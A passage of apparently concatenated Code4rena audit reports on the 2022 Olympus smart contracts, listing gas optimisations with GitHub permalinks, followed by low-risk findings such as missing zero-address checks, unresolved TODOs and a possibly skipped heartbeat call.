/ numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         }         //@audit _movingAverage can be calculated to a local variable and then assigned to state so the local variable is read rather than the state in the emit          // Push new observation into storage and store timestamp taken at         observations[nextObsIndex] = currentPrice;         lastObservationTime = uint48(block.timestamp);         nextObsIndex = (nextObsIndex + 1) % numObs;                   emit NewObservation(block.timestamp, currentPrice, _movingAverage);     } ``` ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L134-L147  Same scenario here with all 4 variables in the emit https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L164-L177  ### Mitigation Consider a local variable for avoiding unnecessary reads.  ## Variables should be cached when used several times ### Summary Variables read more than once improves gas usage when cached into local variable ### Details In loops or state variables, this is even more gas saving  ### Github Permalinks activeProposal.proposalId https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L242-L262 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L266-L285  reward https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L112-L113  ### Mitigation Cache variables used more than one into a local variable.    ## usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead ### Summary When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  ### Details https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html  Use a larger size than downcast where needed  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L44-L59 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L83 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L86 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L89 ### Mitigation Consider using some data type that uses 32 bytes, for example uint256  ## Using bools for storage incurs overhead {  ### Summary Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  ### Details Here is one example of OpenZeppelin about this optimization https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27  Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past  ### Github Permalinks - variables https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L113 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L207 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L394 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L62 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L216 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L33 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L63 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L66 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L735 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L48  - functions/events https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L128 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L121 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAggregator.sol#L74 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/interfaces/IOperator.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/interfaces/IOperator.sol#L131 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L778 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L732 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L699 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L634 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L618 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L473 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L363 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L240 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L340 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L330 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L320 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L302 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L291 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L281 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L184 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L23 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L22 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L21 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L20 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L126 ### Mitigation Consider using uint256 with values 0 and 1 rather than bool    ## Pack structs tightly ### Summary Gas efficiency can be achieved by tightly packing the struct. Struct variables are stored in 32 bytes each so you can group smaller types to occupy less storage.   ### Details You can read more here: https://fravoll.github.io/solidity-patterns/tight_variable_packing.html or in the official documentation: https://docs.soliditylang.org/en/v0.4.21/miscellaneous.html ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/interfaces/IOperator.sol#L30-L35  ### Mitigation Order structs to reduce gas usage.  ## Store using Struct over multiple mappings ### Summary All these variables could be combine in a Struct in order to reduce the gas cost.  ### Details As noticed in:  https://gist.github.com/alexon1234/b101e3ac51bea3cbd9cf06f80eaa5bc2 When multiple mappings that access the same addresses, uints, etc, all of them can be mixed into an struct and then that data accessed like: mapping(datatype => newStructCreated) newStructMap; Also, you have this post where it explains the benefits of using Structs over mappings  https://medium.com/@novablitz/storing-structs-is-costing-you-gas-774da988895e  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L168 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L174-L181 - - -  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/external/OlympusERC20.sol#L666-L669 - - - https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L35-L39 - - - https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L95-L117  ### Mitigation Consider mixing different mappings into an struct when able in order to save gas.   ## Using private rather than public for constants saves gas ### Summary If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L59     `uint8 public constant decimals = 18;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L65     `uint256 public constant FACTOR_SCALE = 1e4;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L121     `uint256 public constant SUBMISSION_REQUIREMENT = 100;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L124     `uint256 public constant ACTIVATION_DEADLINE = 2 weeks;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L127     `uint256 public constant GRACE_PERIOD = 1 weeks;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L130     `uint256 public constant ENDORSEMENT_THRESHOLD = 20;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L133     `uint256 public constant EXECUTION_THRESHOLD = 33;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L137     `uint256 public constant EXECUTION_TIMELOCK = 3 days;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L89     `uint32 public constant FACTOR_SCALE = 1e4;`  ### Mitigation Consider replacing public for private in constants for gas saving.   ## Index initialized in for loop ### Summary In for loops is not needed to initialize indexes to 0 as it is the default uint/int value. This saves gas.  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L397 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L58   ### Mitigation Don't initialize variables to default value   ## ++i costs less gas compared to i++, the same happens with --i and i--  ### Summary ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration).  This statement is true even with the optimizer enabled.   ### Details i++ increments i and returns the initial value of i .  Which means: uint i = 1; i++; // == 1 but i == 2  But ++i returns the actual incremented value:  uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable  In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  ### Github Permalinks var++ https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L49 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L64 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L488 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L670 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L686  var-- https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L675 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L691   ### Mitigation Replace to ++i or --i as needed.    ## <array>.length should no be looked up in every loop of a for-loop ### Summary In loops not assigning the length to a variable so memory accessed a lot (caching local variables)  ### Details The overheads outlined below are PER LOOP, excluding the first loop storage arrays incur a Gwarmaccess (100 gas) memory arrays use MLOAD (3 gas) calldata arrays use CALLDATALOAD (3 gas)  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L278  ### Mitigation Assign the length of the array.length to a local variable in loops for gas savings     ## Shift right instead of dividing by 2 ### Summary Shifting is cheaper than dividing by 2  ### Details A division by 2 can be calculated by shifting one to the right. While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity’s division operation also includes a division-by-0 prevention which is bypassed using shifting.  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L372 `int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L427 `int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L41 `/// @dev                        Should be calculated as: (payoutDecimals - quoteDecimals) - ((payoutPriceDecimals - quotePriceDecimals) / 2)`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L419 `uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L420 `uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L786 `) * (FACTOR_SCALE + RANGE.spread(true) * 2)) /`  ### Mitigation Consider replacing / 2 with >> 1 here   ## Internal functions only called once can be inlined to save gas ### Summary Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls. ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L111-L114 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L652 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L409 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L378 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L351 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L325 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L295 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L279 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L266  ### Mitigation Consider changing internal function only called once to inline code for gas savings    ## Functions guaranteed to revert when called by normal users can be marked payable ### Summary If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function.  Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.  ### Details The extra opcodes avoided are: CALLVALUE (2), DUP1 (3), ISZERO (3), PUSH2 (3), JUMPI (10), PUSH1 (3), DUP1 (3), REVERT(0), JUMPDEST (1), POP (2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L439 `function grantRole(Role role_, address addr_) public onlyAdmin {`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L451 `function revokeRole(Role role_, address addr_) public onlyAdmin {`  ### Mitigation It's suggested to add payable to functions guaranteed to revert when called by normal users to improve gas costs   ## >= cheaper than > ### Summary Strict inequalities ( > ) are more expensive than non-strict ones ( >= ). This is due to some supplementary checks (ISZERO, 3 gas)  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L247 `if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {`  ### Mitigation Consider using >= 1 instead of > 0 to avoid some opcodes   ## <X> += <Y> costs more gas than <X> = <X> + <Y> for state variables ### Summary x+=y costs more gas than x=x+y for state variables  ### Github Permalinks - += https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L136  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L96  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L97  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L131  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/VOTES.sol#L58  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/BondCallback.sol#L143  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/BondCallback.sol#L144  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L198  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L252  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L254  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L103    - Same as += with state variables but -=  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L138  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L115  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L116  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L132  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/VOTES.sol#L56  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L194  ### Mitigation Don't use += for state variables as it cost more gas.  ## Use calldata instead of memory for function parameters ### Summary It is generally cheaper to load variables directly from calldata, rather than copying them to memory.  ### Details Only use memory if the variable needs to be modified ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L205 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/BondCallback.sol#L152 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L162 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L162 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/PriceConfig.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/TreasuryCustodian.sol#L53 ### Mitigation Use calldata rather than memory in external functions where the parameter is not modified but only read  ## Unused named returns ### Summary Using both named returns and a return statement isn’t necessary. Removing one of those can improve code clarity  ### Details Also as returns variable is ignored, it wastes extra gas  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L29 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/MINTR.sol#L25-L27 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L113-L115 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L115-L117 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L51-L53 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/VOTES.sol#L26-L29 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/BondCallback.sol#L177 ### Mitigation Remove return or returns when both used  
### [G-01] No need to explicitly initialize variables with default values  ### Impact If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  #### Findings: ``` src/Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) { src/utils/KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) { src/utils/KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ### [G-02] Cache Array Length Outside of Loop  #### Impact An array's length should be cached to save gas in for-loops Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  Here, I suggest storing the array's length in a variable before the for-loop, and use it instead:  #### Findings: ``` src/policies/Governance.sol::278 => for (uint256 step; step < instructions.length; ) { ```  ### [G-03] Use Shift Right/Left instead of Division/Multiplication if possible  #### Impact A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  #### Findings: ``` src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); src/policies/Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; src/policies/Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); src/policies/Operator.sol::786 => ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ``` Reference: https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g008---use-shift-rightleft-instead-of-divisionmultiplication-if-possible 
## [L-01] IT IS POSSIBLE THAT beat FUNCTION IS NOT CALLED FOR ENTIRE TIME DURING A FREQUENCY It is possible that the following `beat` function is not called by anybody for the entire time during a frequency. In this case, `PRICE.updateMovingAverage()` is not executed for that frequency. The price information for that frequency is not recorded, and the moving average becomes out-of-date as it is not updated with that frequency's price. Later, after someone calls `beat` again during a new frequency, the price information for the skipped frequency is still missing, and the duration between the current and earliest observations will be larger than specified. Because of this, the moving average deviates from the time-weighted average price to be more like an observation-weighted average price, which is also not as specified. To avoid these bookkeeping discrepancies, it can be beneficial to set up a bot to call `beat` for once during each frequency just in case nobody calls it during a frequency.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92-L109 ```solidity     function beat() external nonReentrant {         if (!active) revert Heart_BeatStopped();         if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();          // Update the moving average on the Price module         PRICE.updateMovingAverage();          // Trigger price range update and market operations         _operator.operate();          // Update the last beat timestamp         lastBeat += frequency();          // Issue reward to sender         _issueReward(msg.sender);          emit Beat(block.timestamp);     } ```  ## [L-02] UNRESOLVED TODO COMMENTS Comment regarding todo indicates that there is an unresolved action item for implementation, which need to be addressed before protocol deployment. Please review the todo comments in the following code.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L657 ```solidity         /// TODO determine if this should use the last price from the MA or recalculate the current price, ideally last price is ok since it should have been just updated and should include check against secondary? ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L51-L67 ```solidity     // TODO Currently allows anyone to revoke any approval EXCEPT activated policies.     // TODO must reorg policy storage to be able to check for deactivated policies.     function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {         if (Policy(policy_).isActive()) revert PolicyStillActive();          // TODO Make sure `policy_` is an actual policy and not a random address.          uint256 len = tokens_.length;         for (uint256 j; j < len; ) {             TRSRY.setApprovalFor(policy_, tokens_[j], 0);             unchecked {                 ++j;             }         }          emit ApprovalRevoked(policy_, tokens_);     } ```  ## [L-03] MISSING ZERO-ADDRESS CHECK FOR CRITICAL ADDRESSES To prevent unintended behaviors, the critical address inputs should be checked against `address(0)`.  Please consider checking `ohm_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L15-L17 ```solidity     constructor(Kernel kernel_, address ohm_) Module(kernel_) {         ohm = OHM(ohm_);     } ```  Please consider checking the addresses of `ohmEthPriceFeed_` and `reserveEthPriceFeed_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L71-L77 ```solidity     constructor(         Kernel kernel_,         AggregatorV2V3Interface ohmEthPriceFeed_,         AggregatorV2V3Interface reserveEthPriceFeed_,         uint48 observationFrequency_,         uint48 movingAverageDuration_     ) Module(kernel_) { ```  Please consider checking the addresses in `tokens_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L77-L81 ```solidity     constructor(         Kernel kernel_,         ERC20[2] memory tokens_,         uint256[3] memory rangeParams_ // [thresholdFactor, cushionSpread, wallSpread]     ) Module(kernel_) { ```  Please consider checking the addresses of `aggregator_` and `ohm_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L38-L45 ```solidity     constructor(         Kernel kernel_,         IBondAggregator aggregator_,         ERC20 ohm_     ) Policy(kernel_) {         aggregator = aggregator_;         ohm = ohm_;     } ```  Please consider checking the addresses in `tokens_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L92-L98 ```solidity     constructor(         Kernel kernel_,         IBondAuctioneer auctioneer_,         IBondCallback callback_,         ERC20[2] memory tokens_, // [ohm, reserve]         uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve]     ) Policy(kernel_) { ```  Please consider checking the address of `rewardToken_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L54-L59 ```solidity     constructor(         Kernel kernel_,         IOperator operator_,         ERC20 rewardToken_,         uint256 reward_     ) Policy(kernel_) { ```  ## [N-01] ESUBMISSION_REQUIREMENT IS USED TO COMPARE AGAINST 10000 BUT ENDORSEMENT_THRESHOLD AND EXECUTION_THRESHOLD ARE USED TO COMPARE AGAINST 100 `ESUBMISSION_REQUIREMENT`, `ENDORSEMENT_THRESHOLD`, and  `EXECUTION_THRESHOLD` in the following code are all used to represent percents. However, `ESUBMISSION_REQUIREMENT` is used to compare against 10000 while `ENDORSEMENT_THRESHOLD` and `EXECUTION_THRESHOLD` are used to compare against 100. This inconsistency can cause confusions and typos in the future. Please consider unifying these constants so they can be used to compare against the same number.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L119-L133 ```solidity     /// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).     /// @dev    This is set to 1% of the total supply.     uint256 public constant SUBMISSION_REQUIREMENT = 100;      ...      /// @notice Endorsements required to activate a proposal as percentage of total supply.     uint256 public 